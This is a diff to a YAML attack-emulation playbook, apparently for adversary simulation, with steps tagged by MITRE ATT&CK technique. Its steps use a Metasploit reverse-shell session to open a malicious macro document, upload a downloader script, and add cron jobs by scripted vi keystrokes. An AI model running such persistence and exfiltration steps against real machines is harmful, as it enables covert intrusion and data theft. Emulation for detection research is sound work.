@@ -144,7 +144,7 @@ commands:
     session: client
 
   - type: sleep
-    seconds: 3
+    seconds: 5
 
   # Open the Document with the malicious macro
   - type: vnc 
@@ -184,19 +184,10 @@ commands:
 
 ################### PERSISTENCE OPTION B, CRON JOB ############################
 
-  # upload cronjob that establishes reverse shell
-  - type: msf-session
-    session: revshell
-    cmd: upload crontab.txt
-    metadata:
-      techniques: "T1105"
-      tactics: "Command and Control"
-      technique_name: "Ingress Tool Transfer"
-
   # upload cronjob that extracts data
   - type: msf-session
     session: revshell
-    cmd: upload downloader.txt
+    cmd: upload downloader.sh
     metadata:
       techniques: "T1105"
       tactics: "Command and Control"
@@ -248,23 +239,87 @@ commands:
       tactics: "Defense Evasion" 
       technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
 
-  # add the cronjob that persists reverse shell
+  # make the downloader script executable
   - type: msf-session
     session: revshell
-    cmd: (crontab -l; cat /home/judy/crontab.txt) | crontab -
+    cmd: chmod +x /home/judy/downloader.sh
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+
+  # add the cronjob 
+  - type: msf-session
+    session: revshell
+    cmd: crontab -e
     metadata:
       techniques: "T1053.003"
       tactics: "Persistence"
       technique_name: "Scheduled Task/Job: Cron"
 
-  # add the cronjob to extract data
   - type: msf-session
     session: revshell
-    cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
+    cmd: ":inoremap jj <ESC>"
     metadata:
-      techniques: "T1029,T1053.003,T1048.001"
-      tactics: "Persistence, Execution,Exfiltration"
-      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "o"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "*/10 * * * * /home/judy/download.sh"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "jj"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "o"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "*/5 * * * * /bin/bash -c /home/judy/.index"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: "jj"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
+
+  - type: msf-session
+    session: revshell
+    cmd: ":wq!\n"
+    metadata:
+      techniques: "T1053.003"
+      tactics: "Persistence"
+      technique_name: "Scheduled Task/Job: Cron"
 
   # find out which windown are open
   - type: msf-session
